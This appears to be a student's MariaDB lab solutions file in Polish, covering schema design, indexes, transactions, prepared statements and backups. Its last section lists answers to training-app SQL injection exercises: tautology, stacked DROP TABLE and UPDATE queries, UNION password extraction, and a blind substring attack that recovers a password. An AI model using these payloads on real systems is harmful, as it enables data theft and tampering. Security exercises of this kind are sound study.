@@ -1,0 +1,308 @@
+	ZAD1.
+Stosowanie numeru PESEL jako klucza głównego
+Zalety: PESEL jest unikalny w skali kraju i może być użyty do jednoznacznej identyfikacji osoby.
+Wady: PESEL jest długi, co może wpłynąć na wydajność przy dużych zbiorach danych.
+Jeśli PESEL zmieni się w przyszłości (np. w wyniku zmian legislacyjnych), dane będą trudne do zarządzania.
+Lepszym rozwiązaniem jest użycie kolumny id jako klucza głównego (autoinkrementowanego), a PESEL traktować jako unikalne pole.
+
+CREATE DATABASE laby_trzy;
+USE laby_trzy;
+
+CREATE TABLE Ludzie (
+    id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+    PESEL CHAR(11) UNIQUE NOT NULL,
+    imie VARCHAR(30) NOT NULL,
+    nazwisko VARCHAR(30) NOT NULL,
+    data_urodzenia DATE NOT NULL,
+    plec ENUM('K', 'M') NOT NULL,
+    CONSTRAINT chk_PESEL_format CHECK (PESEL REGEXP '^[0-9]{11}$')
+);
+
+CREATE TABLE Zawody (
+    zawod_id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+    nazwa VARCHAR(50) NOT NULL,
+    pensja_min FLOAT NOT NULL CHECK (pensja_min >= 0),
+    pensja_max FLOAT NOT NULL CHECK (pensja_max > pensja_min)
+);
+
+CREATE TABLE Pracownicy (
+    pracownik_id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+    PESEL CHAR(11) NOT NULL,
+    zawod_id INT UNSIGNED NOT NULL,
+    pensja FLOAT NOT NULL CHECK (pensja >= 0),
+    CONSTRAINT fk_pesel FOREIGN KEY (PESEL) REFERENCES Ludzie(PESEL) ON DELETE CASCADE ON UPDATE CASCADE,
+    CONSTRAINT fk_zawod FOREIGN KEY (zawod_id) REFERENCES Zawody(zawod_id) ON DELETE CASCADE ON UPDATE CASCADE
+);
+
+-- Inserting 5 minors (born between 2007 and 2023)
+INSERT INTO Ludzie (PESEL, imie, nazwisko, data_urodzenia, plec) VALUES
+('08210112345', 'Marek', 'Nowak', '2008-01-01', 'M'),
+('09301522348', 'Anna', 'Kowalska', '2009-10-15', 'K'),
+('09250256789', 'Piotr', 'Jankowski', '2009-05-02', 'M'),
+('08270967890', 'Kasia', 'Wisniewska', '2008-07-09', 'K'),
+('10321598765', 'Tomasz', 'Lewandowski', '2010-12-15', 'M');
+
+-- 45 adults (birth years 1964-2006)
+INSERT INTO Ludzie (PESEL, imie, nazwisko, data_urodzenia, plec) VALUES
+('94050332347', 'Jan', 'Nowak', '1994-05-01', 'M'),
+('64010112345', 'Jan', 'Nowak', '1964-01-01', 'M'),
+('75031556789', 'Maria', 'Kowalska', '1975-03-15', 'K'),
+('88050912345', 'Piotr', 'Jankowski', '1988-05-09', 'M'),
+('94071098765', 'Anna', 'Wisniewska', '1994-07-10', 'K'),
+('85040523456', 'Tomasz', 'Lewandowski', '1985-04-05', 'M'),
+('95090534567', 'Monika', 'Zielinska', '1995-09-05', 'K'),
+('83020645678', 'Adam', 'Wojcik', '1983-02-06', 'M'),
+('77081456789', 'Katarzyna', 'Nowak', '1977-08-14', 'K'),
+('96050967890', 'Piotr', 'Kwiatkowski', '1996-05-09', 'M'),
+('85031278901', 'Agnieszka', 'Szymanska', '1985-03-12', 'K'),
+('80011589012', 'Marek', 'Lewandowski', '1980-01-15', 'M'),
+('92070123456', 'Joanna', 'Jankowska', '1992-07-01', 'K'),
+('90081734567', 'Ryszard', 'Zielinski', '1990-08-17', 'M'),
+('78050645678', 'Karolina', 'Kowalska', '1978-05-06', 'K'),
+('69071556789', 'Sebastian', 'Jablonski', '1969-07-15', 'M'),
+('84041167890', 'Ewa', 'Wisniewska', '1984-04-11', 'K'),
+('86080378901', 'Tomasz', 'Sikora', '1986-08-03', 'M'),
+('95010489012', 'Magdalena', 'Kwiatkowska', '1995-01-04', 'K'),
+('88090590123', 'Krzysztof', 'Dabrowski', '1988-09-05', 'M'),
+('93021012345', 'Olga', 'Wojcik', '1993-02-10', 'K'),
+('80061923456', 'Grzegorz', 'Zielinski', '1980-06-19', 'M'),
+('76020234567', 'Marta', 'Nowak', '1976-02-02', 'K'),
+('75032445678', 'Marek', 'Jankowski', '1975-03-24', 'M'),
+('95061856789', 'Lidia', 'Wisniewska', '1995-06-18', 'K'),
+('80070267890', 'Robert', 'Zawisza', '1980-07-02', 'M'),
+('97030378901', 'Patryk', 'Dabrowski', '1997-03-03', 'M'),
+('89041789012', 'Anna', 'Kwiatkowska', '1989-04-17', 'K'),
+('96060490123', 'Adrian', 'Sikora', '1996-06-04', 'M'),
+('88070312345', 'Katarzyna', 'Kowalska', '1988-07-03', 'K'),
+('84050623456', 'Lukasz', 'Wojcik', '1984-05-06', 'M'),
+('91020834567', 'Natalia', 'Jablonska', '1991-02-08', 'K'),
+('92020145678', 'Bartlomiej', 'Nowak', '1992-02-01', 'M'),
+('86081256789', 'Aleksandra', 'Zielinska', '1986-08-12', 'K'),
+('96041567890', 'Jakub', 'Lewandowski', '1996-04-15', 'M'),
+('92060678901', 'Anna', 'Dabrowska', '1992-06-06', 'K'),
+('89090989012', 'Michal', 'Wisniewski', '1989-09-09', 'M'),
+('78032590123', 'Izabela', 'Kwiatkowska', '1978-03-25', 'K'),
+('80080412345', 'Janusz', 'Zawisza', '1980-08-04', 'M'),
+('93061223456', 'Alicja', 'Kwiatkowska', '1993-06-12', 'K'),
+('97050334567', 'Tomasz', 'Sikora', '1997-05-03', 'M'),
+('88071656789', 'Andrzej', 'Nowak', '1988-07-16', 'M'),
+('82021967890', 'Katarzyna', 'Dabrowska', '1982-02-19', 'K'),
+('89040178901', 'Zbigniew', 'Wojcik', '1989-04-01', 'M'),
+('84041190123', 'Renata', 'Wisniewska', '1984-04-11', 'K');
+
+
+-- Inserting 5 seniors (born before 1964)
+INSERT INTO Ludzie (PESEL, imie, nazwisko, data_urodzenia, plec) VALUES
+('41010112345', 'Wladyslaw', 'Kowalski', '1941-01-01', 'M'),
+('52051522348', 'Jadwiga', 'Nowak', '1952-05-15', 'K'),
+('63090256789', 'Andrzej', 'Jankowski', '1963-09-02', 'M'),
+('57071167890', 'Krystyna', 'Wisniewska', '1957-07-11', 'K'),
+('60061598765', 'Zofia', 'Lewandowska', '1960-06-15', 'K');
+
+
+-- Insert professions with salary ranges
+INSERT INTO Zawody (nazwa, pensja_min, pensja_max) VALUES
+('Polityk', 5000.00, 20000.00),
+('Nauczyciel', 2500.00, 6000.00),
+('Lekarz', 8000.00, 15000.00),
+('Informatyk', 4000.00, 30000.00);
+
+
+
+DELIMITER $$
+
+CREATE PROCEDURE przypisz_zawody()
+BEGIN
+    DECLARE done INT DEFAULT 0;
+    DECLARE p_pesel CHAR(11);
+    DECLARE p_plec ENUM('K', 'M');
+    DECLARE p_zawod_id INT;
+    DECLARE p_pensja FLOAT;
+    DECLARE p_data_urodzenia DATE;
+    DECLARE random_job INT; 
+
+    DECLARE cur CURSOR FOR 
+    SELECT PESEL, plec, data_urodzenia FROM Ludzie
+    WHERE TIMESTAMPDIFF(YEAR, data_urodzenia, CURDATE()) >= 18;
+
+    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = 1;
+
+    OPEN cur;
+
+    read_loop: LOOP
+        FETCH cur INTO p_pesel, p_plec, p_data_urodzenia;
+
+        IF done THEN
+            LEAVE read_loop;
+        END IF;
+
+	SET random_job = FLOOR(1 + (RAND() * 2));
+
+        IF (random_job = 1 AND p_plec = 'M' AND TIMESTAMPDIFF(YEAR, p_data_urodzenia, CURDATE()) <= 65) THEN
+            SET p_zawod_id = 3;
+            SET p_pensja = FLOOR(8000 + (RAND() * 7001));
+        ELSEIF (random_job = 1 AND p_plec = 'K' AND TIMESTAMPDIFF(YEAR, p_data_urodzenia, CURDATE()) <= 60) THEN
+            SET p_zawod_id = 3;
+            SET p_pensja = FLOOR(8000 + (RAND() * 7001));
+        ELSE
+            SET random_job = FLOOR(1 + (RAND() * 3));
+
+            CASE random_job
+                WHEN 1 THEN
+                    SET p_zawod_id = 1;
+                    SET p_pensja = FLOOR(5000 + (RAND() * 15000));
+                WHEN 2 THEN
+                    SET p_zawod_id = 2;
+                    SET p_pensja = FLOOR(2500 + (RAND() * 3500));
+                WHEN 3 THEN
+                    SET p_zawod_id = 4;
+                    SET p_pensja = FLOOR(4000 + (RAND() * 26000));
+            END CASE;
+        END IF;
+
+
+        INSERT INTO Pracownicy (PESEL, zawod_id, pensja)
+        VALUES (p_pesel, p_zawod_id, p_pensja);
+
+    END LOOP;
+
+    CLOSE cur;
+END$$
+
+DELIMITER ;
+
+
+
+	ZAD2.
+
+CREATE INDEX idx_plec_imie ON Ludzie (plec, imie);
+CREATE INDEX idx_pensja ON Pracownicy (pensja);
+
+SHOW INDEX wyświetla informacje o istniejących indeksach dla danej tabeli.
+SHOW INDEX FROM Ludzie;
+
+EXPLAIN analizuje plan wykonania zapytania i pokazuje, czy i jak indeksy są używane.
+EXPLAIN SELECT * FROM Ludzie WHERE plec = 'K' AND imie = 'Anna';
+
+• wszystkich kobiet, których imię zaczyna się na ’A’
+SELECT * FROM ludzie WHERE plec = 'K' AND imie LIKE 'A%'; 
+SELECT * FROM ludzie WHERE imie LIKE 'A%' AND plec = 'K'; idx_plec_imie
+• wszystkich kobiet,
+SELECT * FROM ludzie WHERE plec = 'K'; null
+• wszystkich osób, których imię zaczyna się na ’K’, 
+SELECT * FROM ludzie WHERE imie like 'K%'; null
+• wszystkich osób zarabiających ponizej  2000, 
+SELECT * FROM pracownicy WHERE pensja < 2000; idx_pensja
+• wszystkich informatyków płci męskiej, zarabiających powyzej 10000. 
+SELECT l.imie, l.nazwisko, p.pensja, z.nazwa
+FROM Pracownicy p
+JOIN Zawody z ON p.zawod_id = z.zawod_id
+JOIN Ludzie l ON p.PESEL = l.PESEL
+WHERE z.nazwa = 'Informatyk' AND p.pensja > 10000 AND l.plec = 'M';
+NULL, NULL, PESEL|idx_plec_imie
+
+Jakie mamy obecnie indeksy założone dla obu tabel?
+SHOW INDEX FROM Ludzie;
+SHOW INDEX FROM Pracownicy;
+
+
+
+	ZAD3.
+
+DELIMITER //
+
+CREATE PROCEDURE podwyzka_zawodowa (IN nazwa_zawodu VARCHAR(50))
+BEGIN
+	DECLARE przekroczenie_max INT;
+
+	START TRANSACTION;
+
+	SELECT COUNT(*) INTO przekroczenie_max 
+	FROM pracownicy p JOIN zawody z USING (zawod_id)
+	WHERE z.nazwa = nazwa_zawodu AND (p.pensja * 1.05) > z.pensja_max;
+		
+	IF przekroczenie_max > 0 THEN
+		ROLLBACK;
+	ELSE
+		UPDATE Pracownicy p
+        	JOIN Zawody z ON p.zawod_id = z.zawod_id
+        	SET p.pensja = p.pensja * 1.05
+       		WHERE z.nazwa = nazwa_zawodu;
+
+		COMMIT;
+	END IF;
+END;//
+
+DELIMITER ;
+
+
+SELECT p.pracownik_id, p.pensja, z.pensja_max
+FROM pracownicy p JOIN zawody z USING (zawod_id)
+WHERE z.nazwa = 'Nauczyciel';
+
+CALL podwyzka_zawodowa('Nauczyciel');
+
+Transakcja pozwala na spełnienie właściwości ACID
+
+
+
+	ZAD4.
+SET @query = 'SELECT COUNT(*) AS liczba_kobiet FROM Pracownicy p JOIN Ludzie l ON p.PESEL = l.PESEL JOIN Zawody z ON p.zawod_id = z.zawod_id WHERE l.plec = ''K'' AND z.nazwa = ?';
+
+PREPARE stmt FROM @query;
+
+SET @zawod = 'Informatyk';
+EXECUTE stmt USING @zawod;
+
+DEALLOCATE PREPARE stmt;
+
+
+	ZAD5.
+Stworzenie backup'u (w konsoli mariadb bez logowania się)
+mysqldump -u root -p laby_trzy > C:\Users\Sara\Desktop\Laby\dbBackup\laby_trzy_backup.sql
+
+Usuwanie bazy danych ( w konsoli mariadb po zalogowaniu się)
+DROP DATABASE laby_trzy;
+
+Przywrócenie bazy danych
+CREATE DATABASE laby_trzy;
+
+w konsoli mariadb bez logowania się
+ mysql -u root -p laby_trzy < C:\Users\Sara\Desktop\Laby\dbBackup\laby_trzy_backup.sql
+
+Jaka jest róznica midzy backupem pełnym a różnicowym? 
+Backup pełny tworzy kopię całej bazy danych i jest niezależny od wcześniejszych kopii.
+Backup różnicowy zawiera tylko dane zmienione od ostatniego pełnego backupu.
+Przykład zastosowania: pełny backup jest wykonywany raz na tydzień, np. w niedzielę.
+Różnicowy backup jest wykonywany codziennie i zawiera zmiany od ostatniego pełnego backupu.
+
+
+	ZAD6.
+SQL Injection intro:
+2. SELECT department FROM employees WHERE first_name = 'Bob' AND last_name = 'Franco';
+3. UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett';
+4. ALTER TABLE employees ADD phone VARCHAR(20);
+5. GRANT SELECT ON grant_rights to unauthorized_user;
+9. Smith' OR '1'='1
+10. SELECT * From user_data WHERE Login_Count = 1 and userid= 0 OR 1=1
+11. Smith   3SL99A' OR '1'='1
+12.
+Smith
+3SL99A'; UPDATE employees SET salary = 100000 WHERE last_name = 'Smith' AND auth_tan = '3SL99A
+13.
+Smith'; DROP TABLE access_log;--
+
+
+SQL Injection advanced:
+3. 
+Smith'; SELECT * FROM user_system_data WHERE '1'='1
+Smith' UNION SELECT userid,user_name, password, 'a', 'b', 'c', 1 from user_system_data --
+5. in register field
+tom' AND '1'='1
+tom' AND substring(password,1,1)='t -> user {0} already exists
+tom' AND substring(password,1,6)='thisis
+tom' AND substring(password,1,8)='thisisas
+tom' AND substring(password,1,13)='thisisasecret
+tom' AND substring(password,1,16)='thisisasecretfor
+tom' AND substring(password,1,23)='thisisasecretfortomonly
+User: tom Password: thisisasecretfortomonly
